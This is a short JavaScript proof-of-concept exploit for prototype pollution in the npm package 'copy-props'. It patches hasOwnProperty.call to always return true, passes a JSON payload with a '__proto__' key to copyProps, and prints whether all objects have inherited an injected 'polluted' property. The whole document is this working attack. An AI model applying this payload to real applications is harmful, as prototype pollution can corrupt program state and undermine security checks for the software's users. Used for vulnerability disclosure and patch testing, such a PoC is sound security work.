Object.prototype.hasOwnProperty.call = () => true;
console.log({}.polluted);
const copyProps = require('copy-props');
const malicious_payload = '{"__proto__":{"polluted":"yes"}}';
copyProps(JSON.parse(malicious_payload), {});
console.log({}.polluted);